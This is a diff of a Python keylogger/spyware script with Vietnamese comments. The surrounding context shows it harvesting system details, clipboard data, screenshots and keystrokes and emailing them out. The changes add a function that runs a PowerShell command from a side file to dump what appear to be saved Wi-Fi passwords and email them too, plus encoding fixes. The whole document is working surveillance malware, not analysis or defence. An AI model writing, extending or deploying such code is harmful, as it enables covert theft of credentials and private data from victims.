@@ -41,6 +41,7 @@ import smtplib
 import socket
 import platform
 import time
+import subprocess
 
 
 # Danh sách tên file
@@ -50,6 +51,7 @@ file_names = [
     "clipboard.txt",
     "screenshot.png",
     "key_log.txt",
+    "wifi.txt",
 ]
 
 # Duyệt qua danh sách file
@@ -64,6 +66,7 @@ audio_information = "audio.wav"
 clipboard_information = "clipboard.txt"
 screenshot_information = "screenshot.png"
 keys_information = "key_log.txt"
+wifipass_information = "wifi.txt"
 
 file_path = os.path.dirname(os.path.abspath(__file__)) + "\\"
 
@@ -136,7 +139,7 @@ def send_email(filename, attachment):
 
 # Lấy thông tin máy
 def computer_information():
-    with open(file_path + system_information, "a") as f:
+    with open(file_path + system_information, "a", encoding="utf-8") as f:
         hostname = socket.gethostname()
         IPAddr = socket.gethostbyname(hostname)
 
@@ -156,7 +159,7 @@ send_email(system_information, file_path + system_information)
 # Dữ liệu từ clipboard
 def copy_clipboard():
     try:
-        with open(file_path + clipboard_information, "a") as f:
+        with open(file_path + clipboard_information, "a", encoding="utf-8") as f:
             win32clipboard.OpenClipboard()
             pasted_data = win32clipboard.GetClipboardData()
             win32clipboard.CloseClipboard()
@@ -168,7 +171,7 @@ def copy_clipboard():
             f.write("Clipboard could not be accessed.")
     except Exception as e:
         # Xử lý ngoại lệ khác nếu có
-        with open(file_path + clipboard_information, "a") as f:
+        with open(file_path + clipboard_information, "a", encoding="utf-8") as f:
             f.write("An error occurred: " + str(e))
 
 
@@ -176,6 +179,18 @@ def copy_clipboard():
 def screenshot():
     im = ImageGrab.grab()
     im.save(file_path + screenshot_information)
+
+
+def wifipass():
+    with open("wifi_script.txt", 'r') as file:
+        command = file.read()
+    with open(file_path + wifipass_information, 'a', encoding="utf-8") as file:
+        subprocess.run(["powershell", "-Command", command], stdout=file)
+
+
+ # Mật khẩu wifi
+wifipass()
+send_email(wifipass_information, file_path + wifipass_information)
 
 
 # Kiểm soát trình tự
@@ -238,7 +253,7 @@ while number_of_iterations < number_of_iterations_end:
         # Gửi file nội dung clipboard
         copy_clipboard()
         send_email(clipboard_information, file_path + clipboard_information)
-
+       
         # Tăng số lần lặp
         number_of_iterations += 1
         # Cập nhật lại thời gian
